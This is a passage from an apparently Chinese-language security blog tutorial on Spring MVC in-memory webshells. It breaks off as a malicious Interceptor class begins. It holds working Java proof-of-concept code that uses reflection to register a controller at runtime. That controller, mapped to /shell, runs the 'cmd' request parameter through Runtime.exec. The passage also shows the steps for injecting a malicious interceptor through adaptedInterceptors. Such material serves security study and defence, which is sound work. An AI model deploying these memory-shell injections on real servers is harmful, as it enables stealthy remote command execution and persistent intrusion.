1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br><span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> (Class.forName(<span class="hljs-string">&quot;me.landgrey.SSOLogin&quot;</span>).getDeclaredMethods())[<span class="hljs-number">0</span>];<br><span class="hljs-comment">// 3. 定义访问 controller 的 URL 地址</span><br><span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/hahaha&quot;</span>);<br><span class="hljs-comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span><br><span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br><span class="hljs-comment">// 5. 在内存中动态注册 controller</span><br><span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>r.registerMapping(info, Class.forName(<span class="hljs-string">&quot;恶意Controller&quot;</span>).newInstance(), method);<br></code></pre></td></tr></table></figure><h5 id="registerHandler"><a href="#registerHandler" class="headerlink" title="registerHandler"></a>registerHandler</h5><p>参考上面的 <code>HandlerMapping</code> 接口继承关系图，针对使用 <code>DefaultAnnotationHandlerMapping</code> 映射器的应用，可以找到它继承的顶层类<code>org.springframework.web.servlet.handler.AbstractUrlHandlerMapping</code></p><p>在其<code>registerHandler()</code>方法中</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518808.png" alt="img"></p><p> 该方法接受 <code>urlPath</code>参数和 <code>handler</code>参数，可以在 <code>this.getApplicationContext()</code> 获得的上下文环境中寻找名字为 <code>handler</code> 参数值的 <code>bean</code>, 将 url 和 controller 实例 bean 注册到 <code>handlerMap</code> 中  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span><br>context.getBeanFactory().registerSingleton(<span class="hljs-string">&quot;dynamicController&quot;</span>, Class.forName(<span class="hljs-string">&quot;me.landgrey.SSOLogin&quot;</span>).newInstance());<br><span class="hljs-comment">// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean</span><br>org.springframework.web.servlet.mvc.annotation.<span class="hljs-type">DefaultAnnotationHandlerMapping</span>  <span class="hljs-variable">dh</span> <span class="hljs-operator">=</span> context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);<br><span class="hljs-comment">// 3. 反射获得 registerHandler Method</span><br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(<span class="hljs-string">&quot;registerHandler&quot;</span>, String.class, Object.class);<br>m1.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 4. 将 dynamicController 和 URL 注册到 handlerMap 中</span><br>m1.invoke(dh, <span class="hljs-string">&quot;/favicon&quot;</span>, <span class="hljs-string">&quot;dynamicController&quot;</span>);<br></code></pre></td></tr></table></figure><h5 id="detectHandlerMethods"><a href="#detectHandlerMethods" class="headerlink" title="detectHandlerMethods"></a>detectHandlerMethods</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518516.png" alt="img"></p><p> 该方法仅接受<code>handler</code>参数，同样可以在 <code>this.getApplicationContext()</code> 获得的上下文环境中寻找名字为 <code>handler</code> 参数值的 <code>bean</code>, 并注册 <code>controller</code> 的实例 <code>bean</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">context.getBeanFactory().registerSingleton(<span class="hljs-string">&quot;dynamicController&quot;</span>, Class.forName(<span class="hljs-string">&quot;恶意Controller&quot;</span>).newInstance());<br>org.springframework.web.servlet.mvc.method.annotation.<span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">requestMappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);<br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(<span class="hljs-string">&quot;detectHandlerMethods&quot;</span>, Object.class);<br>m1.setAccessible(<span class="hljs-literal">true</span>);<br>m1.invoke(requestMappingHandlerMapping, <span class="hljs-string">&quot;dynamicController&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="1-3-3-实现恶意-Controller"><a href="#1-3-3-实现恶意-Controller" class="headerlink" title="1.3.3 实现恶意 Controller"></a>1.3.3 实现恶意 Controller</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.web;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ControllerShell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ControllerShell</span><span class="hljs-params">()</span> &#123;&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>        Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-3-4-完整-POC"><a href="#1-3-4-完整-POC" class="headerlink" title="1.3.4 完整 POC"></a>1.3.4 完整 POC</h4><p>POC 并不唯一，想要复现成功取决于自己的<strong>运行环境</strong>，比如 spring boot 版本问题等，<strong>具体问题具体分析！</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.web;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell_controller</span> &#123;<br><br>    <span class="hljs-comment">//    @ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/control&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Spring_Controller</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;<br><br>        <span class="hljs-comment">//获取当前上下文环境</span><br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">//手动注册Controller</span><br>        <span class="hljs-comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> Controller_Shell.class.getDeclaredMethod(<span class="hljs-string">&quot;shell&quot;</span>);<br>        <span class="hljs-comment">// 3. 定义访问 controller 的 URL 地址</span><br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span><br>        <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>        <span class="hljs-comment">// 5. 在内存中动态注册 controller</span><br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        r.registerMapping(info, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Controller_Shell</span>(), method);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Controller_Shell</span>&#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Controller_Shell</span><span class="hljs-params">()</span>&#123;&#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>            <span class="hljs-comment">//获取request</span><br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>            Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>先访问 &#x2F;control 进行 controller 注册，然后访问 controller 映射路径 &#x2F;shell，加上参数就可以实现 RCE</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518492.png" alt="img"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518947.png" alt="img"></p><h4 id="记录问题："><a href="#记录问题：" class="headerlink" title="记录问题："></a>记录问题：</h4><p>环境：</p><p>Spring Boot    v2.6.13</p><p>Spring Framework v5.3.23</p><p>Tomcat 9.0.68</p><p>JDK 1.8.0_65</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518183.png" alt="img"></p><p> <strong>- 核心错误：</strong>（借用 AI 解决）</p><p><strong>java.lang.IllegalArgumentException: Expected lookupPath in request attribute “org.springframework.web.util.UrlPathHelper.PATH”.</strong></p><p>​at org.springframework.util.Assert.notNull(Assert.java:201) ~[spring-core-5.3.23.jar:5.3.23]</p><p>​at org.springframework.web.util.UrlPathHelper.getResolvedLookupPath(UrlPathHelper.java:213) ~[spring-web-5.3.23.jar:5.3.23]</p><p>Spring MVC 在匹配请求路径时，从 <code>request</code> 中没有找到名为 <code>&quot;org.springframework.web.util.UrlPathHelper.PATH&quot;</code> 的属性。</p><p>这是 <strong>Spring 5.3.x</strong> 与 <strong>Tomcat 9 &#x2F; Servlet 4</strong> 之间在请求路径解析机制上的一个兼容性问题。</p><p><strong>出现原因：</strong></p><h3 id="Spring-Boot-版本问题"><a href="#Spring-Boot-版本问题" class="headerlink" title="Spring Boot 版本问题"></a>Spring Boot 版本问题</h3><p>使用的是：</p><p>Spring Boot 2.6.13</p><p>Spring Framework 5.3.23</p><p>Tomcat 9.0.68</p><p>这一代中，Spring MVC 的路径解析默认切换到了 <strong>PathPatternParser</strong>，而部分组件仍然依赖旧的 <code>UrlPathHelper</code>。</p><p>如果你项目中混用了旧式的 <code>@RequestMappingHandlerMapping</code> 或自定义 <code>HandlerMapping</code>，也可能触发这个问题。</p><h3 id="Spring-配置不兼容（可能加了某些配置类）"><a href="#Spring-配置不兼容（可能加了某些配置类）" class="headerlink" title="Spring 配置不兼容（可能加了某些配置类）"></a>Spring 配置不兼容（可能加了某些配置类）</h3><p>从 Spring Boot 2.6 开始：</p><ul><li>默认路径匹配策略从 <code>AntPathMatcher</code> 改成了 <code>PathPatternParser</code>；</li><li>某些旧代码（或自定义 Controller 注册逻辑）没适配这个新规则。</li></ul><p><strong>解决方法：</strong></p><p>在 <code>application.properties</code> 或 <code>application.yml</code> 加上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">spring.mvc.pathmatch.matching-strategy=ant_path_matcher<br></code></pre></td></tr></table></figure><p>意思：强制使用旧版的路径解析机制（与 Spring 2.5 以前版本兼容）。</p><p>适用于目前使用的 Spring Boot 2.6.x。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520466.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518085.png" alt="img"></p><h2 id="2、Interceptor-内存马"><a href="#2、Interceptor-内存马" class="headerlink" title="2、Interceptor 内存马"></a>2、Interceptor 内存马</h2><h3 id="什么是Interceptor"><a href="#什么是Interceptor" class="headerlink" title="什么是Interceptor"></a>什么是Interceptor</h3><p>Spring MVC 的拦截器（Interceptor）与 Java Servlet 的过滤器（Filter）类似，它主要用于拦截用户的请求并做相应的处理，通常应用在权限验证、记录请求信息的日志、判断用户是否登录等功能上。</p><p>在 Spring MVC 框架中定义一个拦截器需要对拦截器进行定义和配置，主要有以下 2 种方式。</p><ul><li>通过实现 HandlerInterceptor 接口或继承 HandlerInterceptor 接口的实现类（例如 HandlerInterceptorAdapter）来定义</li><li>通过实现 WebRequestInterceptor 接口或继承 WebRequestInterceptor 接口的实现类来定义</li></ul><p><strong>Interceptor和Tomcat和Filter过滤器很类似。</strong></p><p>区别如下：</p><ol><li>Interceptor基于反射，Filter基于函数回调</li><li>Interceptor不依赖servlet容器</li><li>Interceptor只能对action请求有用</li><li>Interceptor可以访问action上下文，栈里的对象。Filter不能</li><li>action生命周期中，Interceptor可以被多次调用，Filter只在容器初始化时调用一次</li><li>Interceptor可以获取IOC容器中的bean，Filter不行</li></ol><p>由以上区别，Interceptor的应用和过滤器也就不同，Interceptor用来做日志记录，过滤器用来过滤非法操作</p><h3 id="2-1-Interceptor-创建"><a href="#2-1-Interceptor-创建" class="headerlink" title="2.1 Interceptor 创建"></a>2.1 Interceptor 创建</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.interceptor;<br><br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> String.valueOf(request.getRequestURL());<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br><br>        <span class="hljs-keyword">if</span>(url.indexOf(<span class="hljs-string">&quot;/login&quot;</span>)&gt;= <span class="hljs-number">0</span> )&#123;<br>            writer.write(<span class="hljs-string">&quot;LoginIn&quot;</span>);<br>            writer.flush();<br>            writer.close();<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        writer.write(<span class="hljs-string">&quot;LoginInFirst&quot;</span>);<br>        writer.flush();<br>        writer.close();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/login&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">login</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login Page&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/data&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">data</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Protected Data&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.config;<br><br><span class="hljs-keyword">import</span> com.src.springmem.demos.interceptor.LoginInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> &#123;<br>        registry.addInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginInterceptor</span>())<br>                .addPathPatterns(<span class="hljs-string">&quot;/**&quot;</span>)           <span class="hljs-comment">// 拦截所有路径</span><br>                .excludePathPatterns(<span class="hljs-string">&quot;/login&quot;</span>);   <span class="hljs-comment">// 放行登录接口</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520006.png" alt="img"></p><p>访问可通行的路径：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518686.png" alt="img"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518278.png" alt="img"></p><h3 id="2-2-Interceptor-流程分析"><a href="#2-2-Interceptor-流程分析" class="headerlink" title="2.2 Interceptor 流程分析"></a>2.2 Interceptor 流程分析</h3><p>还是在 DispatcherServlet.doDispatch 处下断点调试</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518820.png" alt="img"></p><p>步入 getHandler()</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081521460.png" alt="img"></p><p>继续跟进，来到一个方法：getHandlerExecutionChain</p><p>该方法从 adaptedInterceptors 中把符合的拦截器添加到 chain 里，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518126.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518756.png" alt="img"></p><p>最后把结果返回到 doDispatch</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081521545.png" alt="img"></p><p>在 doDispath  中执行 applyPreHandle 遍历执行了拦截器。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518383.png" alt="img"></p><p> 其他师傅给出了 Filter,controller,Interceptors执行的顺序：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518441.png" alt="img"></p><ul><li>preHandle( )：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。</li><li>postHandle( )：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。</li><li>afterCompletion( )：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。</li></ul><h3 id="2-3-注册-Interceptor"><a href="#2-3-注册-Interceptor" class="headerlink" title="2.3 注册 Interceptor"></a>2.3 注册 Interceptor</h3><h4 id="2-3-1-获取上下文"><a href="#2-3-1-获取上下文" class="headerlink" title="2.3.1 获取上下文"></a>2.3.1 获取上下文</h4><p>参考 Controller 的获取上下文方式</p><p>这里使用反射获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性</span><br>java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">filed</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;applicationContexts&quot;</span>);<br><span class="hljs-comment">// 2. 属性被 private 修饰，所以 setAccessible true</span><br>filed.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 3. 获取一个 ApplicationContext 实例</span><br>org.springframework.web.context.<span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span>(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="hljs-literal">null</span>)).iterator().next();<br></code></pre></td></tr></table></figure><h4 id="2-3-2-获取adaptedInterceptors属性值"><a href="#2-3-2-获取adaptedInterceptors属性值" class="headerlink" title="2.3.2 获取adaptedInterceptors属性值"></a>2.3.2 获取adaptedInterceptors属性值</h4><p> 获得 <code>ApplicationContext</code> 实例后，还需要知道 <code>org.springframework.web.servlet.handler.AbstractHandlerMapping</code> 类实例的 bean name 叫什么。  </p><p> 我们可以通过<code>ApplicationContext</code>上下文来获取<code>AbstractHandlerMapping</code>，进而反射获取<code>adaptedInterceptors</code>属性值  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">org.springframework.web.servlet.handler.<span class="hljs-type">AbstractHandlerMapping</span> <span class="hljs-variable">abstractHandlerMapping</span> <span class="hljs-operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(<span class="hljs-string">&quot;requestMappingHandlerMapping&quot;</span>);<br>java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>field.setAccessible(<span class="hljs-literal">true</span>);<br>java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);<br></code></pre></td></tr></table></figure><h4 id="2-3-3-恶意-Interceptor"><a href="#2-3-3-恶意-Interceptor" class="headerlink" title="2.3.3 恶意 Interceptor"></a>2.3.3 恶意 Interceptor</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.shell.interceptor;<br> <br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br> 